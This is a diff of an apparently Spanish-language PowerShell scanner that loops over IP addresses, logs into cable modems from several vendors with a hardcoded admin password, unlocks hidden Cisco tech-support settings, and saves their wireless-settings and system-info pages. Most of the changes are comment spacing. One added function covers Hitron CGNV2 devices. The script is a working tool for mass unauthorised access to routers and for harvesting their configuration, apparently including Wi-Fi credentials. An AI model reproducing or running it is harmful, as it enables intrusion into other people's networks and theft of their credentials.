@@ -43,7 +43,7 @@ function setup(){
 }
 
 #===================Routers=====================
-#Technicolor y Thompson que usan DOCSIS 2.0 
+# Technicolor y Thompson que usan DOCSIS 2.0 
 function techTom($ip){
 	echo "$ip - Technicolor - Thompson" 
 	curl --connect-timeout 3 -m 10 -s -u admin:Uq-4GIt3M http://$ip/ | out-null;
@@ -54,7 +54,7 @@ function techTom($ip){
 	verifyFile;
 }
 
-#Cisco DPC3925
+# Cisco DPC3925
 function cisco($ip){
 	echo "$ip - Cisco DPC3925" 
 	$cookie = "$SAVE_FOLDER\$ip"+"cookie.txt"
@@ -68,7 +68,7 @@ function cisco($ip){
 	}
 }
 
-#Tech WAN
+# Tech WAN
 function wan($ip){
 echo "$ip - Wan" 
     curl --connect-timeout 3 -s -m 10 -H 'Host: $ip' -H 'Cache-Control: max-age=0' -H 'Origin: http://$ip' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://$ip/' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' --data "loginUsername=admin&loginPassword=Uq-4GIt3M" --compressed http://$ip/goform/home_loggedout | out-null;
@@ -76,7 +76,7 @@ echo "$ip - Wan"
    	verifyFile
 }
 
-#Motorola con DOCSIS 2.0
+# Motorola con DOCSIS 2.0
 function motorola($ip){ 
 echo "$ip - Motorola DOCSIS 2.0" 
     curl --connect-timeout 3 -m 10 -s --data "loginUsername=admin&loginPassword=Uq-4GIt3M" http://$ip/goform/login | out-null;
@@ -86,7 +86,7 @@ echo "$ip - Motorola DOCSIS 2.0"
     verifyFile
 }
 
-#Motorola SBG900
+# Motorola SBG900
 function motorolasbg($ip){ 
 echo "$ip - Motorola SBG900" 
     if((Invoke-WebRequest -Uri "http://$ip/frames.asp" -Method "POST" -Headers @{"Cache-Control"="max-age=0"; "Origin"="$ip"; "Upgrade-Insecure-Requests"="1"; "DNT"="1"; "User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"; "Accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"; "Referer"="http://$ip/index.asp"; "Accept-Encoding"="gzip, deflate"; "Accept-Language"="es-CO,es-AR;q=0.9,es-419;q=0.8,es;q=0.7,fr;q=0.6"} -ContentType "application/x-www-form-urlencoded" -Body "userId=admin&password=Uq-4GIt3M&btnLogin=Log+In").content -match '\d\d\d\d\d')
@@ -97,7 +97,7 @@ echo "$ip - Motorola SBG900"
     }
 }
 
-#Desbloquear caracteristicas de wireless de los Cisco DPC2420
+# Desbloquear caracteristicas wireless de los Cisco DPC2420
 function unlockCisco($ip){
 	curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessAdv1=1" "http://$ip/goform/techsupport.asp" | out-null;
     curl --connect-timeout 3 -m 10 -s -d "SAHttpAccessOff2=1" "http://$ip/goform/techsupport.asp" | out-null;
@@ -108,7 +108,7 @@ function unlockCisco($ip){
 }
 
 
-#Cisco DPC2420
+# Cisco DPC2420
 function ciscoAuth($ip){
 echo "$ip - Cisco DPC2420" 
 	unlockCisco $ip;
@@ -118,7 +118,7 @@ echo "$ip - Cisco DPC2420"
     verifyFile
 }
 
-#Technicolor CGA0101
+# Technicolor CGA0101
 function techCGA0101($ip){
 	echo "$ip - Technicolor CGA0101" 
     curl --connect-timeout 10 -s -m 10 -H 'Host: $ip' -H 'Origin: http://$ip' -H 'X-CSRF-TOKEN: ' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Accept: */*' -H 'X-Requested-With: XMLHttpRequest' -H 'Referer: http://$ip/' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' -H 'Cookie: theme-value=css/theme/dark/; lang=en' --data-binary "loginUsername=admin&loginPassword=Uq-4GIt3M" --compressed http://$ip/goform/login | out-null;
@@ -133,6 +133,21 @@ function techDPC3928SL2($ip){
 	curl -o $save --connect-timeout 3 -m 60 -s -H 'Host: $ip' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Referer: http://$ip/WPS.asp' -H 'Accept-Language: es,en;q=0.9,es-419;q=0.8' --compressed http://$ip/WRadioSettings.asp;
     verifyFile
 }
+
+# Hitron CGNV2
+function hitron($ip){
+	echo "$ip - Hitron CGNV2" 
+	$cookie = "$SAVE_FOLDER\$ip"+"cookie.txt"
+    wget -qO- -q --keep-session-cookies --save-cookies $cookie --post-data "user=admin^&pws=Uq-4GIt3M" -T 3 http://$ip/goform/login | out-null;
+    if(Test-Path $cookie){
+		wget -qO- -q --load-cookies $cookie -O $save --header="User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36" --header="Referer: http://$ip/Status.asp" --header="Connection: keep-alive" -T 3 http://$ip/msoadmin/cable-Systeminfo.asp | out-null;
+		verifyFile
+		Remove-Item $cookie;
+	}else{
+		echo "No se pudo obtener acceso a $ip. Verificar credenciales"
+	}
+}
+
 function runScanner(){
 	setup
 	foreach($line in Get-Content .\NATIp.txt) {
